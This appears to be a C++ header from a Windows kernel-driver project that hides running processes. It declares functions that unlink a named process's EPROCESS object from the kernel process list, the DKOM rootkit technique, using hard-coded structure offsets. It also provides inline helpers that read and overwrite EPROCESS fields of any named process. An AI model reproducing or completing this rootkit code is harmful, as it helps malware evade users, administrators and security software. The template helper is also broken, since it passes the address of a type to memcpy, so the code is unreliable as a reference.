#pragma once
#include "Driver.h"


#define LOC_ENTRY 0x448
#define LOC_NEXT_ENTRY 0x00
#define LOC_BACK_ENTRY 0x08
#define LOC_NAME 0x5a8
#define LOC_BASE_ADDRES 0x520

#define NAME_SIZE 15
#define BUFFER 1000

#define ROTATION_LIMIT 500

#define SIMPLE_SEARCH false 
#define COMPLICATED_SEARCH true 

#define FULL_MATCH -1
#define NO_MATCH 0

typedef struct comparisonRes {
	PEPROCESS proc;
	unsigned short amount_of_matches;
} compRes;

/// <summary>
/// function remove the process param from the linked list of the processes in the system by 
/// changing the 'next' pointer of the previous object (that pointed at the param process untill now)
/// to point at the 'next' object that the param process pointed at. that way we make the list to 
/// 'skip' the param proces.
/// </summary>
/// <param name="process"> pointer of the process to remove from the list </param>
void removeProcessFromList(PEPROCESS process);

/// <summary>
/// function print the name of the current process (the process that runs this code, with allways 
/// will be 'system'. This is a check function. 
/// </summary>
void printCurrentProcessName();

/// <summary>
/// function print the names of all the processes running in the system by going over the procesess 
/// objects in the procesess linked list. 
/// </summary>
/// <returns> whether the operation was comleted succesfully or not </returns>
int listProcesses(char processes[]);

/// <summary>
/// function hide process from the system by removing him from the linked list of the processes objects
/// </summary>
/// <param name="procName"> the name of the process to hide </param>
int hideProcess(char procName[]);

/// <summary>
/// function compare to string and searchs part of oen string and another and so on, and giving a grade 
/// that indicates how similar the strings are. RIGHT NOW NOT IN USE AND NOT WRITTEN
/// </summary>
/// <param name="processName"> the first string </param>
/// <param name="searchedName"> the second string </param>
/// <returns> the comperation grade </returns>
int compareNames(char name1[], char name2[]);

/// <summary>
/// function find the next process object in the linked list
/// </summary>
/// <param name="curr"> the current object that we want to find his next </param>
/// <returns> the next object that was found </returns>
PEPROCESS getNextProcess(PEPROCESS current);

/// <summary>
/// function finds the pointer to process object by the name of the process. the function gos over the
/// processes objects in the list and check if each one match the param name 
/// </summary>
/// <param name="name"> the name of the wanted process </param>
/// <param name="deepSearch"> the type of the names check. if true -> consider names that arn't fully 
/// the same as equals. for example 'cmd' == 'cmd.exe'. if false -> consider only names that are comlitly
/// the same (except upper or lower case differnces) as equal. </param>
/// <returns> the pointer to the process object wanted </returns>
PEPROCESS findProcessByName(const char name[], bool deepSearch);


/// <summary>
/// function finds the addres of member of specific eprocess 
/// </summary>
/// <param name="procname"> the name of the procces (the indicator for with eprocces to
///  take the member from </param>
/// <param name="memberLoc"> the location of the wanted member in the eprocces structure </param>
/// <returns> the addres to the wanted member </returns>

inline PVOID getEproccesMemberAddres(const char procname[], unsigned short memberLoc)
{
	PEPROCESS p = findProcessByName(procname, SIMPLE_SEARCH);
	return (char*)p + memberLoc;
}

/// <summary>
/// function implement a value to one of the memebers of an eprocces object 
/// </summary>
/// <typeparam name="T"> the type of the value to implement </typeparam>
/// <param name="procname"> the name of the procces, the param for recognizing the dst eprocces </param>
/// <param name="memberloc"> the location of the member in the eprocces to change </param>
/// <param name="value"> the value to implement </param>
/// <param name="valSize"> the size of the member </param>
template<class T>
inline void putEproccesMember(char procname[], unsigned short memberloc, const T& value, unsigned short valSize)
{
	PEPROCESS eprocces = findProcessByName(procname, SIMPLE_SEARCH);
	memcpy(eprocces + memberloc, &T, valSize);
}

